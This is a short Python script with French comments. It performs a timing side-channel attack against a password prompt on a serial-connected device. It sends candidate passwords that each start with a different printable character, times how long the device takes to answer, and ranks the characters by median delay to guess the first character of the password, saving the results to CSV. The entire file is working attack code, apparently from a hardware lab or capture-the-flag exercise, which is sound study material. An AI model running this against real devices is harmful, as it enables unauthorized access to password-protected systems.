
import serial
import time
import random
import statistics
import string
import csv

PORT = "COM11"  # A adapter
BAUDRATE = 9600
N = 30

# Tous les caractères ASCII imprimables, sans espace
alphabet = string.ascii_letters + string.digits + string.punctuation

# Longueur de test fixe (hypothèse initiale)
LENGTH = 8
FILLER = "a"

results = {c: [] for c in alphabet}

# On mélange les essais pour réduire les biais
trials = list(alphabet) * N
random.shuffle(trials)

with serial.Serial(PORT, BAUDRATE, timeout=2) as ser:

    # Attendre le prompt initial si présent
    ser.reset_input_buffer()

    for i, c in enumerate(trials):

        candidate = c + FILLER * (LENGTH - 1)

        ser.reset_input_buffer()

        start = time.perf_counter_ns()

        ser.write((candidate + "\n").encode("ascii"))
        ser.flush()

        # Mesure jusqu'au premier octet reçu
        first_byte = ser.read(1)
        elapsed_us = (time.perf_counter_ns() - start) / 1000

        response = first_byte + ser.read_until(b"Enter password:")

        if b"ACCESS DENIED" in response:
            results[c].append(elapsed_us)

        if (i + 1) % 100 == 0:
            print(f"{i + 1}/{len(trials)} essais")

ranking = []

for c in alphabet:
    values = results[c]

    if len(values) >= 2:
        median = statistics.median(values)
        ranking.append((c, median, statistics.stdev(values)))

ranking.sort(key=lambda x: x[1], reverse=True)

print("\nTOP 10 :")
for c, median, std in ranking[:10]:
    print(f"{repr(c):6} | median = {median:.2f} us | std = {std:.2f} us")

with open("first_character_results.csv", "w", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(["character", "median_us", "std_us"])

    for c, median, std in ranking:
        writer.writerow([c, median, std])
